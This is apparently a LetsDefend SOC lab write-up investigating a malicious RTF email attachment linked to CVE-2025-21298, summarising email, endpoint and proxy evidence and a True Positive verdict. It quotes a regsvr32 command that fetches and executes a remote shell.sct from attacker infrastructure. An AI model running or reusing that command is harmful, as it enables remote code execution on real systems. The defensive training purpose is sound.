# SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)

## Executive Summary

A critical email-based malware alert was triggered after a user received a suspicious RTF attachment associated with CVE-2025-21298. During the investigation, I confirmed that the attachment was malicious, identified Outlook spawning cmd.exe, observed regsvr32.exe LOLBin abuse to retrieve a remote .sct payload, and validated the network request to attacker-controlled infrastructure through proxy logs. The alert was classified as a True Positive and escalated for Incident Response.


This case needed to investigate the alert across multiple telemetry sources:

- Email security --> suspicious sender, malicious attachment, phishing lure
- Threat intelligence --> malicious file hash and exploit-related detections
- Endpoint telemetry --> Outlook spawning cmd.exe and regsvr32.exe
- Network / proxy logs --> confirmed access to malicious remote infrastructure

### Key Findings

- Malicious email delivered to the user with RTF attachment mail.rtf
- Attachment hash flagged by 27/61 vendors in VirusTotal
- Detections linked the file to CVE-2025-21298
- Endpoint logs showed OUTLOOK.EXE spawning cmd.exe
- cmd.exe executed regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll
- Proxy logs confirmed a permitted GET request to http://84.38.130.118.com/shell.sct
- Incident classified as True Positive and escalated to IR

### Final Verdict

- Field           |	Value
- Classification  |	True Positive
- Severity	      | Critical
- Attack Type	    | Malicious Email / Exploit Attachment / LOLBin Execution
- Escalated to IR |	Yes

### Tools / Data Sources Used
- LetsDefend Email Security
- LetsDefend Endpoint Security
- LetsDefend Log Management
- VirusTotal
- MITRE ATT&CK

# Complete investigation


